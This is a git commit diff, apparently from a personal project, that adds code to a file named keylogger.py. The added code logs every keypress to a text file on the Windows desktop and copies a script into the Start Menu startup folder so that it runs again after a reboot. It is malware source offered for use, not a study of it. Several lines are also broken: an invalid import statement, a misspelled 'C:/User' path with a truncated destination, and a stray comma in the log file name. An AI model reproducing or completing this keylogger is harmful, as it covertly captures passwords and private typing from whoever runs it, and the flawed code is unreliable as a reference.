eb47f78cda7e3e65616fe7a1209c0c5a678e2695
medxkh <medkh6699@gmail.com>
2020-12-06 15:05:40 +0100

    final commit

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,20 @@
+import pynput.keyboard import listener
 import os 
 import logging
+from shutil import copyfile
 
 
 username = os.getlogin()
 loggin_directory = f"C:/Users/{username}/Desktop"
 
+copyfile('main.py',f'C:/User/{username}/AppData/Roaming/Start Menu/Start ')
+
 logging.basicConfig(filename=f"{loggin_directory}/mylog.txt, ", level=logging.DEBUG,format="%(asctime)s: %(message)s")
 
 
 def key_handler(key):
+    logging.info(key)
+
+with listener(on_press=key_handler) as listener:
+    listener.join() 
     
